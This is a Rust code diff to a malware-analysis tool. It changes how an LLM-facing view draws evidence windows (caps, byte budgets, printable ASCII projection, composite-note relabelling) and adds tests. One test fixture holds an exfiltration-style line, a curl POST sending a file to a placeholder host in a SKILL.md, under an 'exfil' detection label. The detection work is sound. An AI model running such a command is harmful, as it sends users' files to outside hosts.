@@ -552,6 +552,31 @@ pub struct TinyOpts {
     ///
     /// `None` (every built-in preset) renders as before.
     pub focus_crit: Option<Criticality>,
+    /// Windows drawn per finding id in a file, in file order; `0` draws every
+    /// captured location (capture keeps up to three per atomic trait). The
+    /// LLM view draws one: a trait's second and third location repeat the
+    /// evidence its first already showed, and over a 96-sample corpus the
+    /// repeats were 11% of the render with no grade that depended on them.
+    pub windows_per_finding: usize,
+    /// Context windows drawn per file, strongest first (the best `conf × crit`
+    /// note each carries; ties in file order); `0` draws them all. A finding
+    /// whose only window falls past the cap still lists as a location-less
+    /// note, so the cap costs evidence, never findings. The LLM view allows
+    /// 64 within [`Self::window_bytes`].
+    pub max_windows: usize,
+    /// Bytes of window content drawn per file, strongest windows first; `0`
+    /// is unlimited. A byte budget rather than a count because windows differ
+    /// in weight: a byte window is four 64-byte rows, a source window one to
+    /// three lines. A flat count of 16 took a 63 MB installer's 100+ windows
+    /// (30k tokens) down to the sixteen that carried its grade, but also cut
+    /// a 28 KB minified extension's 68 line windows to 16 and lost its grade
+    /// (eval, chmod, shell spawn all fell past the cap). The LLM view budgets
+    /// 12 KiB: ~40 byte windows or ~80 source windows.
+    pub window_bytes: usize,
+    /// Byte windows open on the row the match starts in and run one row past
+    /// the match, instead of the criticality-sized margin either side. The
+    /// leading rows were machine code and padding a model reads nothing from.
+    pub lean_rows: bool,
     /// Card layout (litmus's terminal view). The caller prints the artifact's
     /// own header (verdict rule, name, hash), so cleave renders only the body:
     /// the root file gets *no* header or divider rule, every file renders
@@ -586,6 +611,10 @@ impl TinyOpts {
             low_tier_fill: 0,
             focus_crit: None,
             card: false,
+            windows_per_finding: 0,
+            max_windows: 0,
+            window_bytes: 0,
+            lean_rows: false,
         }
     }
 
@@ -614,9 +643,21 @@ impl TinyOpts {
             // rendering empty. An empty render tells the LLM nothing, and a
             // file wrongly graded hostile could never be talked back down.
             low_tier_fill: 15,
+            windows_per_finding: if legacy_windows() { 0 } else { 1 },
+            max_windows: if legacy_windows() { 0 } else { 64 },
+            window_bytes: if legacy_windows() { 0 } else { 12 * 1024 },
+            lean_rows: !legacy_windows(),
             ..Self::terminal()
         }
     }
+}
+
+/// `CLEAVE_TINY_LEGACY_WINDOWS=1` restores the pre-2026-09-06 LLM windows —
+/// every captured location, no per-file cap, margin rows either side of a byte
+/// match — for A/B runs.
+fn legacy_windows() -> bool {
+    static ON: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
+    *ON.get_or_init(|| std::env::var("CLEAVE_TINY_LEGACY_WINDOWS").as_deref() == Ok("1"))
 }
 
 /// Caller-supplied adornments for the first file's rich header. All are
@@ -837,16 +878,40 @@ pub fn format_context_badged(
             selected.clone()
         };
 
+        // The LLM view withholds composites, but capture's overlap dedup let a
+        // composite's note outrank its own leg's at the same span — so the
+        // located evidence left with the conclusion and the leg rendered as a
+        // bare note (an agent skill's `curl --data-binary @file` line never
+        // reached the grader). Hand such notes to the omitted legs instead.
+        let relabeled = if minimal && shows_context && !relabel_disabled() {
+            relabel_composite_notes(file, &context_selected).map(|context| FileAnalysis {
+                context,
+                ..file.clone()
+            })
+        } else {
+            None
+        };
+        let file_view: &FileAnalysis = relabeled.as_ref().unwrap_or(file);
+
         // The ids actually drawn as byte/source windows by `render_context`: a
         // context note whose id the window view will render. This is the single
         // source of truth for the windowed-vs-location-less split — a selected
         // finding not in this set renders as a location-less note instead.
+        let plan = window_plan(file_view, &context_selected, opts);
+        let windowed: HashSet<&str> = plan
+            .iter()
+            .flatten()
+            .flat_map(|ids| ids.iter().copied())
+            .collect();
+        // Findings that hold a note but whose every window the plan cut: they
+        // were capped, not dominated, so the no-anchor block must still list
+        // them (see `render_no_anchor`'s dominance rule).
         let context_sel: HashSet<&str> = context_selected.iter().copied().collect();
-        let windowed: HashSet<&str> = file
+        let capped: HashSet<&str> = file_view
             .context
             .iter()
             .flat_map(|l| l.notes.iter().map(|n| n.id.as_str()))
-            .filter(|id| context_sel.contains(id))
+            .filter(|id| context_sel.contains(id) && !windowed.contains(id))
             .collect();
 
         // Nested files (archive members, embedded payloads) indent under their
@@ -865,6 +930,7 @@ pub fn format_context_badged(
             file,
             &selected,
             &windowed,
+            &capped,
             &id_to_file,
             opts,
             shows_context,
@@ -872,8 +938,9 @@ pub fn format_context_badged(
         );
         render_context(
             &mut body,
-            file,
+            file_view,
             &context_selected,
+            &plan,
             opts,
             eff_width,
             colorize,
@@ -1056,6 +1123,166 @@ fn indent_block(out: &mut String, block: &str, depth: u32) {
 }
 
 /// Whether a file contributes anything to the context view.
+/// Context windows with every note for a withheld composite reassigned to the
+/// composite's own legs, or `None` when nothing changes.
+///
+/// The LLM/tiny view drops composites and shows their legs (`select_ids`), but
+/// the capture pass keeps only the strongest note on an overlapping span —
+/// `conf × crit` — and a hostile composite anchored on its leg's evidence beats
+/// that notable leg every time. The leg then owned no note at all: the window
+/// with the matched line was drawn only if some other selected trait happened
+/// to sit on it, and its annotation was never the leg's. A note whose id is a
+/// native composite becomes one note per leg that is selected here and has no
+/// located note of its own, at the composite's span with the leg's identity;
+/// a composite with no such leg keeps its (unselected, unrendered) note, and
+/// a composite that is itself selected (a leg of a wider one) keeps its own.
+/// Which context windows a file draws and which selected findings each one
+/// annotates: `None` for a window not drawn, else the note ids it renders.
+///
+/// Applies [`TinyOpts::windows_per_finding`] in file order (a finding's first
+/// windows claim it), then [`TinyOpts::max_windows`] and
+/// [`TinyOpts::window_bytes`] by strength — the best `conf × crit` note a
+/// window carries, ties in file order; a window that would overspend the byte
+/// budget is skipped and weaker, smaller ones may still fit. The plan is the
+/// single source of truth for the windowed-vs-location-less split: a selected
+/// finding in no drawn window renders as a bare note instead.
+fn window_plan<'a>(
+    file: &'a FileAnalysis,
+    selected: &[&'a str],
+    opts: &TinyOpts,
+) -> Vec<Option<HashSet<&'a str>>> {
+    let sel: HashSet<&str> = selected.iter().copied().collect();
+    let mut drawn: HashMap<&str, usize> = HashMap::new();
+    let mut strength: Vec<(f32, usize)> = Vec::new();
+    let mut plan: Vec<Option<HashSet<&'a str>>> = Vec::with_capacity(file.context.len());
+    for (i, line) in file.context.iter().enumerate() {
+        let mut ids: HashSet<&'a str> = HashSet::new();
+        let mut best = 0f32;
+        for n in &line.notes {
+            let id = n.id.as_str();
+            if !sel.contains(id) || ids.contains(id) {
+                continue;
+            }
+            let count = drawn.entry(id).or_insert(0);
+            if opts.windows_per_finding > 0 && *count >= opts.windows_per_finding {
+                continue;
+            }
+            *count += 1;
+            ids.insert(id);
+            best = best.max(n.conf * f32::from(n.crit.rank()));
+        }
+        if ids.is_empty() {
+            plan.push(None);
+        } else {
+            strength.push((best, i));
+            plan.push(Some(ids));
+        }
+    }
+    let capped = opts.max_windows > 0 && strength.len() > opts.max_windows;
+    let budgeted = opts.window_bytes > 0
+        && strength
+            .iter()
+            .map(|&(_, i)| file.context[i].data.len())
+            .sum::<usize>()
+            > opts.window_bytes;
+    if capped || budgeted {
+        strength.sort_by(|a, b| b.0.total_cmp(&a.0).then_with(|| a.1.cmp(&b.1)));
+        let mut kept = 0usize;
+        let mut spent = 0usize;
+        for &(_, i) in &strength {
+            let bytes = file.context[i].data.len();
+            let fits = (opts.max_windows == 0 || kept < opts.max_windows)
+                && (opts.window_bytes == 0 || spent + bytes <= opts.window_bytes);
+            if fits {
+                kept += 1;
+                spent += bytes;
+            } else {
+                plan[i] = None;
+            }
+        }
+    }
+    plan
+}
+
+/// `CLEAVE_TINY_NO_RELABEL=1` leaves withheld composites' notes unassigned
+/// (the pre-2026-09-06 render) for A/B runs.
+fn relabel_disabled() -> bool {
+    static OFF: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
+    *OFF.get_or_init(|| std::env::var("CLEAVE_TINY_NO_RELABEL").as_deref() == Ok("1"))
+}
+
+fn relabel_composite_notes(file: &FileAnalysis, selected: &[&str]) -> Option<Vec<ContextLine>> {
+    let sel: HashSet<&str> = selected.iter().copied().collect();
+    let located: HashSet<&str> = file
+        .context
+        .iter()
+        .flat_map(|l| l.notes.iter().map(|n| n.id.as_str()))
+        .collect();
+    let mut legs: HashMap<&str, Vec<&Finding>> = HashMap::new();
+    for f in &file.findings {
+        // A composite that is itself selected — a leg of a wider composite,
+        // guaranteed by `select_ids` — keeps its own note: it is shown, so
+        // its evidence stays with it.
+        if f.src.is_some() || f.trait_refs.is_empty() || sel.contains(f.id.as_str()) {
+            continue;
+        }
+        let mine: Vec<&Finding> = f
+            .trait_refs
+            .iter()
+            .map(crate::types::Istr::as_str)
+            .filter(|r| sel.contains(r) && !located.contains(r))
+            .filter_map(|r| {
+                file.findings
+                    .iter()
+                    .find(|g| g.src.is_none() && g.id.as_str() == r)
+            })
+            .collect();
+        if !mine.is_empty() {
+            legs.entry(f.id.as_str()).or_default().extend(mine);
+        }
+    }
+    if legs.is_empty() {
+        return None;
+    }
+    let mut changed = false;
+    let context = file
+        .context
+        .iter()
+        .map(|line| {
+            let mut notes = Vec::with_capacity(line.notes.len());
+            for n in &line.notes {
+                match legs.get(n.id.as_str()) {
+                    Some(mine) => {
+                        changed = true;
+                        for leg in mine {
+                            if notes
+                                .iter()
+                                .any(|m: &Note| m.id == leg.id && m.off == n.off)
+                            {
+                                continue;
+                            }
+                            notes.push(Note {
+                                crit: leg.crit,
+                                id: leg.id.clone(),
+                                desc: leg.desc.clone(),
+                                off: n.off,
+                                len: n.len,
+                                conf: leg.conf,
+                            });
+                        }
+                    }
+                    None => notes.push(n.clone()),
+                }
+            }
+            ContextLine {
+                notes,
+                ..line.clone()
+            }
+        })
+        .collect();
+    changed.then_some(context)
+}
+
 fn file_has_output(file: &FileAnalysis, opts: &TinyOpts) -> bool {
     // A file whose only output is what the analysis withheld still has
     // something to say — arguably the most important thing, since a reader
@@ -1644,6 +1871,7 @@ fn render_context(
     out: &mut String,
     file: &FileAnalysis,
     selected: &[&str],
+    plan: &[Option<HashSet<&str>>],
     opts: &TinyOpts,
     term_width: usize,
     colorize: bool,
@@ -1654,12 +1882,12 @@ fn render_context(
         // which a local model reads far more cheaply than a hex|ascii dump.
         // The terminal view keeps the hex|ascii rows.
         if matches!(opts.header, HeaderStyle::Minimal) {
-            render_ascii_context(out, file, selected);
+            render_ascii_context(out, file, plan, opts);
         } else {
             render_hex_context(out, file, selected, term_width, opts, colorize);
         }
     } else {
-        render_text_chunks(out, file, selected, opts, term_width, colorize);
+        render_text_chunks(out, file, plan, opts, term_width, colorize);
     }
 }
 
@@ -1679,19 +1907,26 @@ fn render_context(
 /// it held. Splitting on the gaps restores the property that makes the view
 /// readable — every block is contiguous data that its own annotations account
 /// for.
-fn render_ascii_context(out: &mut String, file: &FileAnalysis, selected: &[&str]) {
+fn render_ascii_context(
+    out: &mut String,
+    file: &FileAnalysis,
+    plan: &[Option<HashSet<&str>>],
+    opts: &TinyOpts,
+) {
     use std::fmt::Write;
-    let sel: HashSet<&str> = selected.iter().copied().collect();
     let marker = comment_marker(&file.file_type);
     let mut emitted = false;
-    for line in &file.context {
-        // Distinct selected findings on this window. (Capture already capped
+    for (line, ids) in file.context.iter().zip(plan) {
+        let Some(ids) = ids else {
+            continue;
+        };
+        // Distinct planned findings on this window. (Capture already capped
         // locations per trait; merging can pool several here.)
         let mut seen = HashSet::new();
         let mut notes: Vec<&Note> = line
             .notes
             .iter()
-            .filter(|n| sel.contains(n.id.as_str()) && seen.insert(n.id.as_str()))
+            .filter(|n| ids.contains(n.id.as_str()) && seen.insert(n.id.as_str()))
             .collect();
         if notes.is_empty() {
             continue;
@@ -1706,7 +1941,11 @@ fn render_ascii_context(out: &mut String, file: &FileAnalysis, selected: &[&str]
         notes.sort_by_key(|n| n.off);
         let mut blocks: Vec<(usize, usize, Vec<&Note>)> = Vec::new();
         for note in notes {
-            let (before, after) = note.crit.hex_context();
+            let (before, after) = if opts.lean_rows {
+                (0, ASCII_ROW as u64)
+            } else {
+                note.crit.hex_context()
+            };
             let lo = within(note.off).saturating_sub(before as usize);
             let hi = (within(note.off + u64::from(note.len.max(1))) + after as usize).min(len);
             match blocks.last_mut() {
@@ -1757,7 +1996,11 @@ fn render_ascii_context(out: &mut String, file: &FileAnalysis, selected: &[&str]
                     out,
                     "{row_lo:x}{} {}",
                     if hit { ':' } else { '-' },
-                    ascii_forward(&line.data[row..row_end])
+                    if escaped_windows() {
+                        ascii_forward(&line.data[row..row_end])
+                    } else {
+                        ascii_printable(&line.data[row..row_end])
+                    }
                 );
                 row = row_end;
             }
@@ -1781,6 +2024,72 @@ const UTF16_RUN: usize = 4;
 /// NUL (2 chars vs 4), `\t`/`\n`/`\r` for whitespace, `\xNN` for other
 /// non-printables, `\\` for a literal backslash; printable ASCII verbatim. A
 /// UTF-16LE ASCII run is collapsed to plain text (the interleaved nulls dropped).
+/// Whether tiny-view byte windows render with `\xNN` escapes
+/// ([`ascii_forward`]) instead of the printable projection
+/// ([`ascii_printable`]). `CLEAVE_TINY_ESCAPED_WINDOWS=1` restores the
+/// escapes for A/B runs.
+fn escaped_windows() -> bool {
+    static ON: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
+    *ON.get_or_init(|| std::env::var("CLEAVE_TINY_ESCAPED_WINDOWS").as_deref() == Ok("1"))
+}
+
+/// The printable projection of a byte window: printable ASCII verbatim, a
+/// UTF-16LE ASCII run collapsed to its text, and every other byte — NUL,
+/// control, high-bit, machine code — a single space, runs of them one space.
+///
+/// What the model reads in a window is the strings: a path, a method name, a
+/// key, an import. Machine-code bytes between them are not evidence it can
+/// use, but rendered as `\xNN` escapes they cost three to four tokens each,
+/// and a 54 MB ELF's 107 windows came to 40k tokens. Measured 2026-09-06 on
+/// 32 benchmark renders graded by the fleet's model, five runs each: this
+/// projection cut the prompts 21% overall (a binary-heavy render 41.5k →
+/// 27.6k tokens) with every grade unchanged, where dropping the context rows
+/// or collapsing runs to a `.{n}` marker each flipped a known-bad .NET
+/// sample. The string boundaries stay visible (each non-printable run is a
+/// space), which is what kept `get_Threshold set_Threshold …` readable as
+/// separate names.
+fn ascii_printable(data: &[u8]) -> String {
+    let printable = |b: u8| (0x20..=0x7e).contains(&b);
+    let mut s = String::with_capacity(data.len());
+    let mut i = 0;
+    let mut gap = false;
+    while i < data.len() {
+        let mut run = 0;
+        while i + run * 2 + 1 < data.len()
+            && printable(data[i + run * 2])
+            && data[i + run * 2 + 1] == 0
+        {
+            run += 1;
+        }
+        if run >= UTF16_RUN {
+            if gap {
+                s.push(' ');
+                gap = false;
+            }
+            for k in 0..run {
+                s.push(data[i + k * 2] as char);
+            }
+            i += run * 2;
+            continue;
+        }
+        let b = data[i];
+        if printable(b) {
+            if gap {
+                s.push(' ');
+                gap = false;
+            }
+            s.push(b as char);
+        } else {
+            gap = true;
+        }
+        i += 1;
+    }
+    if gap {
+        s.push(' ');
+    }
+    s
+}
+
 fn ascii_forward(data: &[u8]) -> String {
     use std::fmt::Write;
     let printable = |b: u8| (0x20..=0x7e).contains(&b) && b != b'\\';
@@ -1890,21 +2199,20 @@ fn chunk_rows(chunk: &ContextLine) -> Vec<ChunkRow> {
 fn render_text_chunks(
     out: &mut String,
     file: &FileAnalysis,
-    selected: &[&str],
+    plan: &[Option<HashSet<&str>>],
     opts: &TinyOpts,
     term_width: usize,
     colorize: bool,
 ) {
     let minimal = matches!(opts.header, HeaderStyle::Minimal);
-    let sel: HashSet<&str> = selected.iter().copied().collect();
     let marker = comment_marker(&file.file_type);
 
-    // Chunks carrying a selected match; a chunk with only unselected notes draws
-    // no window.
-    let shown: Vec<&ContextLine> = file
+    // Chunks the plan draws, each with the finding ids it annotates.
+    let shown: Vec<(&ContextLine, &HashSet<&str>)> = file
         .context
         .iter()
-        .filter(|c| c.notes.iter().any(|n| sel.contains(n.id.as_str())))
+        .zip(plan)
+        .filter_map(|(c, ids)| ids.as_ref().map(|ids| (c, ids)))
         .collect();
     if shown.is_empty() {
         return;
@@ -1913,7 +2221,7 @@ fn render_text_chunks(
     // Gutter width spans the widest line number across shown chunks.
     let loc_width = shown
         .iter()
-        .map(|c| {
+        .map(|(c, _)| {
             let last = c.line.unwrap_or(0) + c.data.iter().filter(|b| **b == b'\n').count() as u64;
             last.max(1).to_string().len()
         })
@@ -1944,7 +2252,7 @@ fn render_text_chunks(
     }
 
     let mut emitted = false;
-    for chunk in shown {
+    for (chunk, ids) in shown {
         // A blank line sets each window apart as its own paragraph — except in
         // the card layout, where the line-number gaps already mark the jumps
         // and the block stays one compact unit.
@@ -1984,7 +2292,7 @@ fn render_text_chunks(
                 .notes
                 .iter()
                 .filter(|n| {
-                    sel.contains(n.id.as_str()) && n.off >= row.off && n.off < row.cover_end
+                    ids.contains(n.id.as_str()) && n.off >= row.off && n.off < row.cover_end
                 })
                 .collect();
             // A context row (no match of its own) earns a line only when it carries
@@ -2679,11 +2987,13 @@ fn paint_spans(text: &str, mut spans: Vec<(usize, usize, Criticality)>) -> Strin
 /// severity-tinted gutter glyph and description (no comment marker — there's no
 /// code to comment on), and a cross-file composite trails its contributing
 /// members; the LLM (Minimal) view uses the `{marker} SEV desc` annotation form.
+#[allow(clippy::too_many_arguments)] // a render primitive; bundling would obscure it
 fn render_no_anchor(
     out: &mut String,
     file: &FileAnalysis,
     selected: &[&str],
     windowed: &HashSet<&str>,
+    capped: &HashSet<&str>,
     id_to_file: &HashMap<u32, &FileAnalysis>,
     opts: &TinyOpts,
     context_shown: bool,
@@ -2703,7 +3013,10 @@ fn render_no_anchor(
     // composites (located in a member, shown with a trail, with no local window to
     // be dominated). Everything else is shown at its offset by the context pass or
     // was dominated and dropped. When no context was captured at all, the block is
-    // the only way to surface findings, so it keeps them.
+    // the only way to surface findings, so it keeps them. A finding in `capped`
+    // holds a note the window plan (`TinyOpts::max_windows`,
+    // `windows_per_finding`) declined to draw — capped, not dominated — so it
+    // is listed here: the cap trades evidence, never findings.
     //
     // A file past the context cap (`context_shown` false) drew no windows even
     // though it captured context, so the dominance argument doesn't apply: this
@@ -2737,7 +3050,10 @@ fn render_no_anchor(
             f.crit >= floor && sel.contains(f.id.as_str()) && !windowed.contains(f.id.as_str())
         })
         .filter(|f| {
-            !captured || file.composite_sources.contains_key(f.id.as_str()) || !has_local_offset(f)
+            !captured
+                || capped.contains(f.id.as_str())
+                || file.composite_sources.contains_key(f.id.as_str())
+                || !has_local_offset(f)
         })
         .collect();
     rest.sort_unstable_by(|a, b| b.crit.cmp(&a.crit).then_with(|| a.id.cmp(&b.id)));
@@ -4564,6 +4880,145 @@ mod tests {
         );
     }
 
+    /// Capture keeps only the strongest note on an overlapping span, so a
+    /// hostile composite anchored on its leg's evidence displaces the leg's own
+    /// note. The tiny view then withholds the composite — and with it the only
+    /// located evidence: the leg rendered as a bare note and the matched line
+    /// never appeared. The composite's note now stands in for the omitted leg.
+    #[test]
+    fn tiny_hands_a_withheld_composite_note_to_its_leg() {
+        let leg = "micro/http/upload::curl-post-file";
+        let mut composite =
+            finding_with("objectives/exfil::skill-posts-file", Criticality::Hostile);
+        composite.trait_refs = vec![leg.to_string().into()];
+        let file = src_file(
+            0,
+            "SKILL.md",
+            50,
+            vec![finding_with(leg, Criticality::Notable), composite],
+            vec![ctx_line(
+                12,
+                "curl -X POST https://h.example/a --data-binary @a\n",
+                Some(ctx_note(
+                    "objectives/exfil::skill-posts-file",
+                    Criticality::Hostile,
+                    12,
+                )),
+            )],
+        );
+        let tiny = format_context(&report_with_files(vec![file]), &TinyOpts::tiny());
+        assert!(
+            tiny.contains("--data-binary @a"),
+            "the leg's matched line must render: {tiny}"
+        );
+        assert!(
+            tiny.contains("# N 12:1 micro/http/upload::curl-post-file"),
+            "the window is annotated with the leg, not the composite: {tiny}"
+        );
+        assert!(
+            !tiny.contains("skill-posts-file"),
+            "the composite stays withheld: {tiny}"
+        );
+    }
+
+    /// A window the per-file cap declines to draw must not take its finding
+    /// with it: the finding lists as a location-less note instead.
+    #[test]
+    fn tiny_window_cap_keeps_capped_findings_as_notes() {
+        let ctx = |i: u64, id: &str| {
+            ctx_line(
+                i * 100,
+                "payload_line_with_enough_code(x)\n",
+                Some(ctx_note(id, Criticality::Notable, i * 100)),
+            )
+        };
+        let mut file = src_file(
+            0,
+            "a.py",
+            50,
+            vec![
+                finding_with("t/one", Criticality::Notable),
+                finding_with("t/two", Criticality::Notable),
+                finding_with("t/three", Criticality::Notable),
+            ],
+            vec![ctx(1, "t/one"), ctx(2, "t/two"), ctx(3, "t/three")],
+        );
+        for (f, c) in file.findings.iter_mut().zip([0.9, 0.8, 0.7]) {
+            f.conf = c;
+        }
+        for (l, c) in file.context.iter_mut().zip([0.9, 0.8, 0.7]) {
+            l.notes[0].conf = c;
+        }
+        let opts = TinyOpts {
+            max_windows: 1,
+            ..TinyOpts::tiny()
+        };
+        let tiny = format_context(&report_with_files(vec![file]), &opts);
+        assert_eq!(
+            tiny.matches("payload_line_with_enough_code").count(),
+            1,
+            "one window drawn: {tiny}"
+        );
+        for id in ["t/one", "t/two", "t/three"] {
+            assert!(tiny.contains(id), "{id} must still be listed: {tiny}");
+        }
+    }
+
+    /// The byte budget keeps the strongest windows that fit and lists the rest
+    /// as notes; a weaker window that still fits is not skipped.
+    #[test]
+    fn tiny_window_byte_budget_keeps_strongest_that_fit() {
+        let big = "x".repeat(300);
+        let mk = |i: u64, id: &str, data: &str, conf: f32| {
+            let mut l = ctx_line(
+                i * 1000,
+                data,
+                Some(ctx_note(id, Criticality::Notable, i * 1000)),
+            );
+            l.notes[0].conf = conf;
+            l
+        };
+        let mut file = src_file(
+            0,
+            "a.py",
+            50,
+            vec![
+                finding_with("t/strong", Criticality::Notable),
+                finding_with("t/mid", Criticality::Notable),
+                finding_with("t/weak", Criticality::Notable),
+            ],
+            vec![
+                mk(1, "t/strong", &format!("strong_call({big})\n"), 0.9),
+                mk(2, "t/mid", &format!("mid_call({big})\n"), 0.8),
+                mk(3, "t/weak", "weak_call(short_enough)\n", 0.7),
+            ],
+        );
+        for (f, c) in file.findings.iter_mut().zip([0.9, 0.8, 0.7]) {
+            f.conf = c;
+        }
+        let opts = TinyOpts {
+            window_bytes: 400,
+            ..TinyOpts::tiny()
+        };
+        let tiny = format_context(&report_with_files(vec![file]), &opts);
+        assert!(
+            tiny.contains("strong_call("),
+            "strongest window drawn: {tiny}"
+        );
+        assert!(
+            !tiny.contains("mid_call("),
+            "second 300-byte window overspends: {tiny}"
+        );
+        assert!(
+            tiny.contains("weak_call("),
+            "a weaker window that fits is drawn: {tiny}"
+        );
+        assert!(
+            tiny.contains("t/mid"),
+            "the budgeted-out finding is still listed: {tiny}"
+        );
+    }
+
     #[test]
     fn tiny_unmatched_component_shows_single_line() {
         // A component trait no composite drew on shows only its own line — no
@@ -5297,6 +5752,20 @@ mod tests {
         assert_eq!(ascii_forward(b"\x7fELF\x02\x01"), "\\x7fELF\\x02\\x01");
         // A UTF-16LE ASCII run collapses to plain text (nulls dropped).
         assert_eq!(ascii_forward(b"P\x00r\x00o\x00d\x00"), "Prod");
+    }
+
+    /// The printable projection keeps strings and their boundaries, drops
+    /// the byte escapes, and still collapses UTF-16 runs.
+    #[test]
+    fn ascii_printable_keeps_strings_and_boundaries() {
+        assert_eq!(
+            ascii_printable(b"\x00getpwuid\x00\x7f\xffsetuid"),
+            " getpwuid setuid"
+        );
+        assert_eq!(ascii_printable(b"a<b\\c"), "a<b\\c");
+        assert_eq!(ascii_printable(b"\x7fELF\x02\x01\x01"), " ELF ");
+        assert_eq!(ascii_printable(b"P\x00r\x00o\x00d\x00\x00\x00X"), "Prod X");
+        assert_eq!(ascii_printable(b"plain text"), "plain text");
     }
 
     #[test]
